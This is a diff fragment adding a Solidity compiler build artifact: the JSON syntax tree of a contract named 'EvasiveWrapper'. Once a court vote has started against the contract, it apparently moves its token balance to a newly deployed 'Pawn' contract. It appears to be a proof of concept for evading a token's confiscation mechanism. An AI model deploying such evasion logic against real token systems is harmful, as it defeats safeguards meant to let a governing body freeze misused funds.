+                    "id": 96,
+                    "name": "VariableDeclarationStatement",
+                    "src": "1116:31:0"
+                  },
+                  {
+                    "attributes": {
+                      "falseBody": null
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "commonType": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          },
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": ">",
+                          "type": "bool"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "isStructConstructorCall": false,
+                              "lValueRequested": false,
+                              "names": [
+                                null
+                              ],
+                              "type": "uint256",
+                              "type_conversion": false
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": [
+                                    {
+                                      "typeIdentifier": "t_contract$_EvasiveWrapper_$146",
+                                      "typeString": "contract EvasiveWrapper"
+                                    }
+                                  ],
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "lValueRequested": false,
+                                  "member_name": "voteStartTimes",
+                                  "referencedDeclaration": 5,
+                                  "type": "function (address) view external returns (uint256)"
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": null,
+                                      "overloadedDeclarations": [
+                                        null
+                                      ],
+                                      "referencedDeclaration": 92,
+                                      "type": "contract SlimCourt",
+                                      "value": "court"
+                                    },
+                                    "id": 97,
+                                    "name": "Identifier",
+                                    "src": "1154:5:0"
+                                  }
+                                ],
+                                "id": 98,
+                                "name": "MemberAccess",
+                                "src": "1154:20:0"
+                              },
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 175,
+                                  "type": "contract EvasiveWrapper",
+                                  "value": "this"
+                                },
+                                "id": 99,
+                                "name": "Identifier",
+                                "src": "1175:4:0"
+                              }
+                            ],
+                            "id": 100,
+                            "name": "FunctionCall",
+                            "src": "1154:26:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "hexvalue": "30",
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": true,
+                              "lValueRequested": false,
+                              "subdenomination": null,
+                              "token": "number",
+                              "type": "int_const 0",
+                              "value": "0"
+                            },
+                            "id": 101,
+                            "name": "Literal",
+                            "src": "1183:1:0"
+                          }
+                        ],
+                        "id": 102,
+                        "name": "BinaryOperation",
+                        "src": "1154:30:0"
+                      },
+                      {
+                        "children": [
+                          {
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "arguments": [
+                                    null
+                                  ],
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "isStructConstructorCall": false,
+                                  "lValueRequested": false,
+                                  "names": [
+                                    null
+                                  ],
+                                  "type": "tuple()",
+                                  "type_conversion": false
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": [
+                                        null
+                                      ],
+                                      "overloadedDeclarations": [
+                                        null
+                                      ],
+                                      "referencedDeclaration": 145,
+                                      "type": "function ()",
+                                      "value": "newPawn"
+                                    },
+                                    "id": 103,
+                                    "name": "Identifier",
+                                    "src": "1192:7:0"
+                                  }
+                                ],
+                                "id": 104,
+                                "name": "FunctionCall",
+                                "src": "1192:9:0"
+                              }
+                            ],
+                            "id": 105,
+                            "name": "ExpressionStatement",
+                            "src": "1192:9:0"
+                          }
+                        ],
+                        "id": 106,
+                        "name": "Block",
+                        "src": "1187:19:0"
+                      }
+                    ],
+                    "id": 107,
+                    "name": "IfStatement",
+                    "src": "1151:55:0"
+                  }
+                ],
+                "id": 108,
+                "name": "Block",
+                "src": "1112:97:0"
+              }
+            ],
+            "id": 109,
+            "name": "FunctionDefinition",
+            "src": "1088:121:0"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "implemented": true,
+              "isConstructor": false,
+              "modifiers": [
+                null
+              ],
+              "name": "newPawn",
+              "payable": false,
+              "scope": 146,
+              "stateMutability": "nonpayable",
+              "superFunction": null,
+              "visibility": "internal"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 110,
+                "name": "ParameterList",
+                "src": "1228:2:0"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 111,
+                "name": "ParameterList",
+                "src": "1240:0:0"
+              },
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "assignments": [
+                        113
+                      ]
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "constant": false,
+                          "name": "oldPawn",
+                          "scope": 145,
+                          "stateVariable": false,
+                          "storageLocation": "default",
+                          "type": "contract SlimEtherNomin",
+                          "value": null,
+                          "visibility": "internal"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "contractScope": null,
+                              "name": "SlimEtherNomin",
+                              "referencedDeclaration": 25,
+                              "type": "contract SlimEtherNomin"
+                            },
+                            "id": 112,
+                            "name": "UserDefinedTypeName",
+                            "src": "1244:14:0"
+                          }
+                        ],
+                        "id": 113,
+                        "name": "VariableDeclaration",
+                        "src": "1244:22:0"
+                      },
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "contract SlimEtherNomin",
+                          "type_conversion": true
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                {
+                                  "typeIdentifier": "t_address",
+                                  "typeString": "address"
+                                }
+                              ],
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 25,
+                              "type": "type(contract SlimEtherNomin)",
+                              "value": "SlimEtherNomin"
+                            },
+                            "id": 114,
+                            "name": "Identifier",
+                            "src": "1269:14:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 69,
+                              "type": "address",
+                              "value": "pawn"
+                            },
+                            "id": 115,
+                            "name": "Identifier",
+                            "src": "1284:4:0"
+                          }
+                        ],
+                        "id": 116,
+                        "name": "FunctionCall",
+                        "src": "1269:20:0"
+                      }
+                    ],
+                    "id": 117,
+                    "name": "VariableDeclarationStatement",
+                    "src": "1244:45:0"
+                  },
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "=",
+                          "type": "address"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 69,
+                              "type": "address",
+                              "value": "pawn"
+                            },
+                            "id": 118,
+                            "name": "Identifier",
+                            "src": "1293:4:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "isStructConstructorCall": false,
+                              "lValueRequested": false,
+                              "names": [
+                                null
+                              ],
+                              "type": "contract Pawn",
+                              "type_conversion": false
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": [
+                                    {
+                                      "typeIdentifier": "t_contract$_SlimEtherNomin_$25",
+                                      "typeString": "contract SlimEtherNomin"
+                                    }
+                                  ],
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "lValueRequested": false,
+                                  "type": "function (address) returns (contract Pawn)"
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "contractScope": null,
+                                      "name": "Pawn",
+                                      "referencedDeclaration": 65,
+                                      "type": "contract Pawn"
+                                    },
+                                    "id": 119,
+                                    "name": "UserDefinedTypeName",
+                                    "src": "1304:4:0"
+                                  }
+                                ],
+                                "id": 120,
+                                "name": "NewExpression",
+                                "src": "1300:8:0"
+                              },
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 67,
+                                  "type": "contract SlimEtherNomin",
+                                  "value": "nomin"
+                                },
+                                "id": 121,
+                                "name": "Identifier",
+                                "src": "1309:5:0"
+                              }
+                            ],
+                            "id": 122,
+                            "name": "FunctionCall",
+                            "src": "1300:15:0"
+                          }
+                        ],
+                        "id": 123,
+                        "name": "Assignment",
+                        "src": "1293:22:0"
+                      }
+                    ],
+                    "id": 124,
+                    "name": "ExpressionStatement",
+                    "src": "1293:22:0"
+                  },
+                  {
+                    "attributes": {
+                      "assignments": [
+                        126
+                      ]
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "constant": false,
+                          "name": "balanceToMigrate",
+                          "scope": 145,
+                          "stateVariable": false,
+                          "storageLocation": "default",
+                          "type": "uint256",
+                          "value": null,
+                          "visibility": "internal"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "name": "uint",
+                              "type": "uint256"
+                            },
+                            "id": 125,
+                            "name": "ElementaryTypeName",
+                            "src": "1319:4:0"
+                          }
+                        ],
+                        "id": 126,
+                        "name": "VariableDeclaration",
+                        "src": "1319:21:0"
+                      },
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "uint256",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                {
+                                  "typeIdentifier": "t_contract$_SlimEtherNomin_$25",
+                                  "typeString": "contract SlimEtherNomin"
+                                }
+                              ],
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "balanceOf",
+                              "referencedDeclaration": 15,
+                              "type": "function (address) view external returns (uint256)"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 67,
+                                  "type": "contract SlimEtherNomin",
+                                  "value": "nomin"
+                                },
+                                "id": 127,
+                                "name": "Identifier",
+                                "src": "1343:5:0"
+                              }
+                            ],
+                            "id": 128,
+                            "name": "MemberAccess",
+                            "src": "1343:15:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 113,
+                              "type": "contract SlimEtherNomin",
+                              "value": "oldPawn"
+                            },
+                            "id": 129,
+                            "name": "Identifier",
+                            "src": "1359:7:0"
+                          }
+                        ],
+                        "id": 130,
+                        "name": "FunctionCall",
+                        "src": "1343:24:0"
+                      }
+                    ],
+                    "id": 131,
+                    "name": "VariableDeclarationStatement",
+                    "src": "1319:48:0"
+                  },
+                  {
+                    "attributes": {
+                      "falseBody": null
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "commonType": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          },
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": ">",
+                          "type": "bool"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 126,
+                              "type": "uint256",
+                              "value": "balanceToMigrate"
+                            },
+                            "id": 132,
+                            "name": "Identifier",
+                            "src": "1374:16:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "hexvalue": "30",
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": true,
+                              "lValueRequested": false,
+                              "subdenomination": null,
+                              "token": "number",
+                              "type": "int_const 0",
+                              "value": "0"
+                            },
+                            "id": 133,
+                            "name": "Literal",
+                            "src": "1393:1:0"
+                          }
+                        ],
+                        "id": 134,
+                        "name": "BinaryOperation",
+                        "src": "1374:20:0"
+                      },
+                      {
+                        "children": [
+                          {
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "isStructConstructorCall": false,
+                                  "lValueRequested": false,
+                                  "names": [
+                                    null
+                                  ],
+                                  "type": "bool",
+                                  "type_conversion": false
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": [
+                                        {
+                                          "typeIdentifier": "t_address",
+                                          "typeString": "address"
+                                        },
+                                        {
+                                          "typeIdentifier": "t_uint256",
+                                          "typeString": "uint256"
+                                        }
+                                      ],
+                                      "isConstant": false,
+                                      "isLValue": false,
+                                      "isPure": false,
+                                      "lValueRequested": false,
+                                      "member_name": "transfer",
+                                      "referencedDeclaration": 24,
+                                      "type": "function (address,uint256) external returns (bool)"
+                                    },
+                                    "children": [
+                                      {
+                                        "attributes": {
+                                          "argumentTypes": null,
+                                          "overloadedDeclarations": [
+                                            null
+                                          ],
+                                          "referencedDeclaration": 113,
+                                          "type": "contract SlimEtherNomin",
+                                          "value": "oldPawn"
+                                        },
+                                        "id": 135,
+                                        "name": "Identifier",
+                                        "src": "1404:7:0"
+                                      }
+                                    ],
+                                    "id": 137,
+                                    "name": "MemberAccess",
+                                    "src": "1404:16:0"
+                                  },
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": null,
+                                      "overloadedDeclarations": [
+                                        null
+                                      ],
+                                      "referencedDeclaration": 69,
+                                      "type": "address",
+                                      "value": "pawn"
+                                    },
+                                    "id": 138,
+                                    "name": "Identifier",
+                                    "src": "1421:4:0"
+                                  },
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": null,
+                                      "overloadedDeclarations": [
+                                        null
+                                      ],
+                                      "referencedDeclaration": 126,
+                                      "type": "uint256",
+                                      "value": "balanceToMigrate"
+                                    },
+                                    "id": 139,
+                                    "name": "Identifier",
+                                    "src": "1427:16:0"
+                                  }
+                                ],
+                                "id": 140,
+                                "name": "FunctionCall",
+                                "src": "1404:40:0"
+                              }
+                            ],
+                            "id": 141,
+                            "name": "ExpressionStatement",
+                            "src": "1404:40:0"
+                          }
+                        ],
+                        "id": 142,
+                        "name": "Block",
+                        "src": "1396:53:0"
+                      }
+                    ],
+                    "id": 143,
+                    "name": "IfStatement",
+                    "src": "1371:78:0"
+                  }
+                ],
+                "id": 144,
+                "name": "Block",
+                "src": "1240:212:0"
+              }
+            ],
+            "id": 145,
+            "name": "FunctionDefinition",
+            "src": "1212:240:0"
+          }
+        ],
+        "id": 146,
+        "name": "ContractDefinition",
+        "src": "894:560:0"
+      }
+    ],
+    "id": 147,
+    "name": "SourceUnit",
+    "src": "334:1121:0"
+  },
+  "compiler": {
+    "name": "solc",
+    "version": "0.4.19+commit.c4cbbb05.Emscripten.clang"
+  },
+  "networks": {},
+  "schemaVersion": "1.0.1",
+  "updatedAt": "2018-02-22T00:30:58.004Z"
+}
